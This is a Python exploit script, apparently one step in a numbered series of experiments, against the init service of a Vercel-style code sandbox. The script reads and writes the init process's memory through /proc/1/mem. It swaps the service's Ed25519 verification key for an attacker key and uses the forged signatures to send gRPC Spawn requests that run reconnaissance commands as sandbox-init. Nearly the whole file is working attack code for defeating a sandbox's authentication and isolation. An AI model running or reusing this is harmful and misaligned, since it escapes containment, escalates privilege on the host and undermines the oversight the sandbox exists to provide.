# 实验J17: Spawn 执行任意命令 + 身份侦察 + SpawnEvent 流解析
# J16 成功: grpc 协议 + {} -> "failed to start process: exec: no command"
# proto: SpawnRequest{command=1, arguments=2, environment=3, working_directory=4}
# 目标: 以 sandbox-init 身份执行命令, 确认 uid/caps/挂载可见性
import os, re, subprocess, base64, time, socket, json

def run(cmd, timeout=20):
    try:
        r = subprocess.run(["bash", "-c", cmd], capture_output=True, timeout=timeout)
        return (r.stdout + r.stderr).decode(errors='replace')
    except Exception as e:
        return f"ERR {type(e).__name__}: {e}"

def read_mem_segment(start, size):
    try:
        fd = os.open("/proc/1/mem", os.O_RDONLY)
        d = os.pread(fd, size, start)
        os.close(fd)
        return d
    except Exception:
        return b""

def get_maps():
    out = []
    for line in open("/proc/1/maps"):
        parts = line.split()
        if len(parts) < 2 or parts[1][0] != "r":
            continue
        a0, a1 = parts[0].split("-")
        out.append((int(a0, 16), int(a1, 16)))
    return out

OUT = open("/tmp/j17.txt", "w", buffering=1)
def log(s):
    OUT.write(s + "\n")
    print(s, flush=True)

# ---------- [1] 捕获签名对 ----------
log("== [1] 捕获签名对 ==")
sig_pairs = []
deadline = time.time() + 30
while time.time() < deadline and not sig_pairs:
    for start, end in get_maps():
        size = min(end - start, 16 * 1024 * 1024)
        d = read_mem_segment(start, size)
        if not d:
            continue
        for m in re.finditer(rb"X-Signature: ([A-Za-z0-9+/=]{80,90})", d):
            sig = m.group(1).decode()
            tail = d[m.end():m.end()+200]
            tm = re.search(rb"X-Timestamp: (\d+)", tail)
            ts = tm.group(1).decode() if tm else "?"
            head = d[max(0, m.start()-400):m.start()]
            pm = re.search(rb"POST (/\S+) HTTP/1\.1", head)
            proc = pm.group(1).decode() if pm else "?"
            pair = (proc, ts, sig)
            if pair not in sig_pairs:
                sig_pairs.append(pair)
                log(f"  PAIR: proc={proc} ts={ts}")
    time.sleep(0.05)
if not sig_pairs:
    log("  !! 未捕获")
    OUT.close()
    print("done", flush=True)
    exit(0)

# ---------- [2] pubkey + 验证 + 替换 ----------
cmdline = run("cat /proc/1/cmdline | tr '\\0' ' '")
m = re.search(r"--pubkey=([A-Za-z0-9+/=]+)", cmdline)
pub_raw = base64.b64decode(m.group(1))
log(f"[2] pubkey: {m.group(1)}")
spki = bytes.fromhex("302a300506032b6570032100") + pub_raw
open("/tmp/pub.spki", "wb").write(spki)
run("openssl pkey -pubin -inform DER -in /tmp/pub.spki -out /tmp/pub.pem 2>&1")

def verify(msg: bytes, sig_b64: str) -> bool:
    open("/tmp/msg.bin", "wb").write(msg)
    open("/tmp/sig.bin", "wb").write(base64.b64decode(sig_b64))
    out = run("openssl pkeyutl -verify -pubin -inkey /tmp/pub.pem -rawin -in /tmp/msg.bin -sigfile /tmp/sig.bin 2>&1")
    return "Signature Verified Successfully" in out

fmt_ok = False
for proc, ts, sig in sig_pairs:
    if verify(proc.encode() + ts.encode(), sig):
        log(f"  proc+ts 确认")
        fmt_ok = True
        break
if not fmt_ok:
    log("  !! 验证失败")
    OUT.close()
    print("done", flush=True)
    exit(0)

copies = []
for line in open("/proc/1/maps"):
    parts = line.split()
    if len(parts) < 2 or parts[1][0] != "r":
        continue
    a0, a1 = parts[0].split("-")
    start, end = int(a0, 16), int(a1, 16)
    try:
        fd = os.open("/proc/1/mem", os.O_RDONLY)
        d = os.pread(fd, min(end - start, 16 * 1024 * 1024), start)
        os.close(fd)
    except Exception:
        continue
    idx = 0
    while True:
        i = d.find(pub_raw, idx)
        if i < 0:
            break
        copies.append(start + i)
        idx = i + 1
log(f"  pubkey 副本: {[hex(c) for c in copies]}")

run("openssl genpkey -algorithm ED25519 -out /tmp/atk_priv.pem 2>&1")
run("openssl pkey -in /tmp/atk_priv.pem -pubout -outform DER -out /tmp/atk_pub.der 2>&1")
atk_pub = open("/tmp/atk_pub.der", "rb").read()[-32:]
fdm = os.open("/proc/1/mem", os.O_RDWR)
backups = []
for off in copies:
    backups.append((off, os.pread(fdm, 32, off)))
    os.pwrite(fdm, atk_pub, off)
log(f"  已替换 {len(copies)} 处")

def sign(msg: bytes) -> bytes:
    open("/tmp/msg.bin", "wb").write(msg)
    run("openssl pkeyutl -sign -inkey /tmp/atk_priv.pem -rawin -in /tmp/msg.bin -out /tmp/sig.bin 2>&1")
    return open("/tmp/sig.bin", "rb").read()

# ---------- [3] Spawn 执行命令 ----------
log("== [3] Spawn 执行侦察命令 ==")
SPAWN = "/vercel.sandbox.spawn.v1.SpawnService/Spawn"
CMD = ("id; echo ===; grep -E 'Uid|Gid|Cap' /proc/self/status; echo ===; "
       "cat /proc/self/attr/current 2>/dev/null; echo ===; "
       "head -20 /proc/1/mountinfo; echo ===; ls -la /run/vercel/share/ /run/vercel/ 2>&1; echo ===; "
       "ls -la / | head -15")
jb = json.dumps({"command": "/bin/sh", "arguments": ["-c", CMD]}).encode()

def grpc_frame(j):
    return b"\x00" + len(j).to_bytes(4, "big") + j

def dechunk(data):
    out = b""
    i = 0
    while i < len(data):
        j = data.find(b"\r\n", i)
        if j < 0:
            break
        try:
            ln = int(data[i:j], 16)
        except Exception:
            break
        if ln == 0:
            break
        out += data[j+2:j+2+ln]
        i = j + 2 + ln + 2
    return out

def parse_grpc_stream(body):
    evs = []
    i = 0
    while i + 5 <= len(body):
        ln = int.from_bytes(body[i+1:i+5], "big")
        if ln <= 0 or i + 5 + ln > len(body):
            break
        evs.append(body[i+5:i+5+ln])
        i += 5 + ln
    return evs

try:
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(20)
    s.connect("/run/vercel/share/init.sock")
    ts = str(int(time.time()))
    body = grpc_frame(jb)
    req = (f"POST {SPAWN} HTTP/1.1\r\nHost: localhost\r\n"
           f"Content-Type: application/grpc+json\r\nContent-Length: {len(body)}\r\n"
           f"X-Signature: {base64.b64encode(sign(SPAWN.encode() + ts.encode())).decode()}\r\n"
           f"X-Timestamp: {ts}\r\n\r\n").encode() + body
    s.sendall(req)
    data = b""
    try:
        while True:
            c = s.recv(8192)
            if not c:
                break
            data += c
    except socket.timeout:
        pass
    s.close()
    head, _, respbody = data.partition(b"\r\n\r\n")
    status = head.split(b" ")[1].decode() if b" " in head else "?"
    log(f"  HTTP {status}")
    log(f"  headers: {head[:500]!r}")
    raw = dechunk(respbody)
    log(f"  raw frames: {raw[:200]!r}")
    events = parse_grpc_stream(raw)
    log(f"  事件数: {len(events)}")
    for i, ev in enumerate(events):
        log(f"  event[{i}]: {ev[:600]!r}")
except Exception as e:
    log(f"  EXC {type(e).__name__}: {e}")

# ---------- [4] 恢复 ----------
log("[4] 恢复 pubkey")
for off, orig in backups:
    os.pwrite(fdm, orig, off)
os.close(fdm)
log("done")
OUT.close()
